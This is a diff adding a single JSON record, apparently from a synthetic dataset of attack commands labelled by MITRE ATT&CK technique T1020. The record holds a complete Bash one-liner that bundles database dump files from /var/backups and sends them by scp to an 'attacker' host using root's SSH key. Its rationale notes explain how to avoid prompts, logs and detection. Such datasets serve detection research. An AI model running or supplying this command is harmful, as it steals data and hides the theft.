@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "ts=$(date +%s); find /var/backups -type f \\( -name '*.sql' -o -name '*.sql.gz' -o -name '*.dump' \\) -print0 | tar --null -T - -czf /tmp/dbdumps_${ts}.tgz >/dev/null 2>&1 && scp -q -C -i /root/.ssh/id_rsa -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /tmp/dbdumps_${ts}.tgz attacker@198.51.100.10:/var/tmp/.cache/db/ >/dev/null 2>&1 && rm -f /tmp/dbdumps_${ts}.tgz",
+  "explanation": "Finds common database dump files, compresses them into a single archive, and quietly exfiltrates using scp with non-interactive authentication.",
+  "rationale_steps": [
+    "Search backup locations for SQL dump patterns to target valuable data.",
+    "Create a compressed tarball to minimize size and number of transfer operations.",
+    "Exfiltrate with scp using SSH keys to avoid prompts and logs.",
+    "Suppress output and remove temporary files to reduce detection footprint."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-e93662d8-261e7fdf",
+  "source_prompt_hash": "e93662d8",
+  "timestamp_utc": "2025-09-30T09:01:25.255647Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
